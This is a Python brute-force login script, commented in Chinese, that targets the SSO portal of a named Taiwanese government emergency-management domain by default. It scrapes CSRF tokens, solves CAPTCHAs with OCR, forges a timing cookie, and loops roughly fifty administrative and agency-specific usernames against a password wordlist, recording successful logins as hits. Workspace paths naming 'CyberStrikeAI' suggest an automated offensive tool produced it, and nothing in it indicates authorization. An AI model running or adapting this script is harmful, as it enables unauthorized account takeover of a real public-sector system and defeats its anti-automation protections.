#!/usr/bin/env python3
"""
brute_v2.py - SSO2 扩展字典爆破脚本
基于 wordlist_v2.txt：覆盖 50+ 用户名（带域账户/Administrator/SA/Root/系统账户/政府术语）
目标: sportal/portal2 SSO2 登录入口
"""
import re
import sys
import time
import json
import requests
import ddddocr
from html.parser import HTMLParser
from io import BytesIO
from PIL import Image
import warnings
warnings.filterwarnings('ignore')

OCR = ddddocr.DdddOcr(show_ad=False)

TARGET_URL = sys.argv[1] if len(sys.argv) > 1 else "https://sportal.emic.gov.tw"
LOGIN_PATH = "/SSO2_Develop/SSO20102/Login"
CAPTCHA_PATH = "/SSO2_Develop/SSO20102/VerificationCode"
SUBMIT_PATH = "/SSO2_Develop/"
WORDLIST = "/opt/CyberStrikeAI/tmp/workspace/projects/cda6ab9b-2296-4103-b1f0-10410de2eca8/wordlist_v2.txt"
LOGFILE = f"/opt/CyberStrikeAI/tmp/workspace/projects/cda6ab9b-2296-4103-b1f0-10410de2eca8/{TARGET_URL.replace('https://','').replace('.','_')}_v2.log"
HITSFILE = f"/opt/CyberStrikeAI/tmp/workspace/projects/cda6ab9b-2296-4103-b1f0-10410de2eca8/{TARGET_URL.replace('https://','').replace('.','_')}_v2_hits.txt"

# HTML parser to extract __RequestVerificationToken
class TokenParser(HTMLParser):
    def __init__(self):
        super().__init__()
        self.token = None
    def handle_starttag(self, tag, attrs):
        if tag == "input" and self.token is None:
            d = dict(attrs)
            if d.get("name") == "__RequestVerificationToken":
                self.token = d.get("value")

def get_token_and_session(target):
    sess = requests.Session()
    sess.headers.update({
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "zh-TW,zh;q=0.9,en;q=0.8",
    })
    sess.verify = False
    try:
        r = sess.get(f"{target}{LOGIN_PATH}", timeout=15)
    except Exception as e:
        return None, None
    p = TokenParser()
    p.feed(r.text)
    return sess, p.token

def get_captcha(sess, target):
    try:
        r = sess.get(f"{target}{CAPTCHA_PATH}?_={int(time.time()*1000)}", timeout=10)
    except Exception:
        return b""
    return r.content if r.status_code == 200 and len(r.content) > 100 else b""

def ocr_captcha(img_bytes):
    try:
        img = Image.open(BytesIO(img_bytes))
        return OCR.classification(img_bytes)
    except Exception:
        return ""

def submit(sess, token, user, pwd, ans, target):
    try:
        # TOTAL_TIME_B anti-CSRF cookie
        sess.cookies.set("TOTAL_TIME_B", str(int(time.time()*1000)), path="/", domain=".emic.gov.tw")
        data = {
            "__RequestVerificationToken": token,
            "Account": user,
            "Password": pwd,
            "Captcha": ans,
        }
        r = sess.post(f"{target}{SUBMIT_PATH}", data=data, timeout=15, allow_redirects=False)
        return r
    except Exception:
        return None

def attempt(user, pwd, target):
    sess, token = get_token_and_session(target)
    if not sess or not token:
        return "ERR_GET_TOKEN", ""
    img = get_captcha(sess, target)
    if len(img) < 200:
        return f"ERR_CAPTCHA_{len(img)}", ""
    ans = ocr_captcha(img)
    if not ans or len(ans) < 3:
        return f"ERR_OCR_EMPTY", f"ocr_len={len(ans) if ans else 0}"
    r = submit(sess, token, user, pwd, ans, target)
    if r is None:
        return "ERR_NET", ""
    loc = r.headers.get("Location", "")
    body = r.text if r.text else ""
    if r.status_code == 302:
        return "REDIRECT", loc
    if r.status_code == 200 and len(body) == 0:
        return "ERR_EMPTY_BODY", ""
    field_err = re.findall(r'<span[^>]*class="field-validation-error"[^>]*data-valmsg-for="(\w+)"[^>]*>([^<]+)</span>', body)
    summary_err = re.findall(r'class="validation-summary-errors"[^>]*>([^<]+)<', body)
    if summary_err and any(s.strip() for s in summary_err):
        msg = " | ".join(s.strip() for s in summary_err if s.strip())
        if "驗證碼" in msg:
            return "WRONG_CAPTCHA", f"summary={msg} cl={len(body)}"
        if "帳號" in msg or "密碼" in msg:
            return "WRONG_PWD", f"summary={msg} cl={len(body)}"
    if field_err:
        for kind, msg in field_err:
            if kind == "Captcha":
                return "WRONG_CAPTCHA", f"field={kind}:{msg} cl={len(body)}"
            elif kind in ("Account", "Password"):
                return "WRONG_PWD", f"field={kind}:{msg} cl={len(body)}"
            else:
                return "FIELD_ERR", f"field={kind}:{msg} cl={len(body)}"
    title = re.search(r'<title>([^<]+)</title>', body)
    title = title.group(1) if title else ""
    keys = re.findall(r'>(歡迎|SSO2|個人|帳號|密碼|驗證碼|忘記|解鎖|災害)<', body)
    keys = sorted(set(keys))[:6]
    return "LOGIN_PAGE_RENDER", f"cl={len(body)} title={title} keys={keys}"

def main():
    with open(WORDLIST, 'r', encoding='utf-8', errors='ignore') as f:
        pwds = [l.strip() for l in f if l.strip()]
    # 主要用户名列表（覆盖 admin 系列 + 系统账户 + 政府术语）
    users = [
        "admin", "Admin", "ADMIN", "administrator", "Administrator",
        "admin@emic.gov.tw", "admin@epcr.tpf.gov.tw", "admin@tpf.gov.tw",
        "sa", "root", "system",
        "sportal", "portal", "portal2", "emic", "epcr", "epicr",
        "operator", "manager", "sso", "sso2", "tpf", "hospital",
        "nec", "emergency", "administrator1",
        "administrator01", "superadmin", "dev", "prod",
        "test", "guest", "demo", "user", "epcr_user", "epcruser",
        "default", "public", "epicruser",
        "sportaladmin", "sportalsso", "epcradmin", "epicradmin",
        "emicadmin", "tpfadmin", "hospitaladmin", "necadmin",
        "epcr1", "epcr01", "tpfuser", "emicuser", "epicruser1",
        "epicr_user", "epicruser", "administrator1", "administrator01",
    ]
    target = TARGET_URL
    print(f"[*] brute_v2 → target={target}", flush=True)
    print(f"[*] users={len(users)} pwds={len(pwds)} combos={len(users)*len(pwds)}", flush=True)

    tried = 0
    hits = 0
    t0 = time.time()
    log = open(LOGFILE, "w", encoding="utf-8", buffering=1)
    hf = open(HITSFILE, "w", encoding="utf-8", buffering=1)
    for u in users:
        for p in pwds:
            tried += 1
            res, info = attempt(u, p, target)
            log.write(f"[{tried}] {u}:{p} → {res} | {info}\n")
            if res == "REDIRECT" or res == "302_REDIR":
                hits += 1
                hf.write(f"[{tried}] {u}:{p} → {res} | {info}\n")
                hf.flush()
                print(f"[HIT {tried}] {u}:{p} → {res} | {info}", flush=True)
            if tried % 50 == 0:
                elapsed = time.time() - t0
                rate = tried / elapsed if elapsed > 0 else 0
                eta = (len(users)*len(pwds) - tried) / rate if rate > 0 else 0
                print(f"[*] tried={tried} hits={hits} elapsed={elapsed:.1f}s rate={rate:.1f}/s eta={eta:.1f}s", flush=True)
    elapsed = time.time() - t0
    print(f"[*] done. tried={tried} time={elapsed:.1f}s hits={hits}", flush=True)
    log.close()
    hf.close()

if __name__ == "__main__":
    main()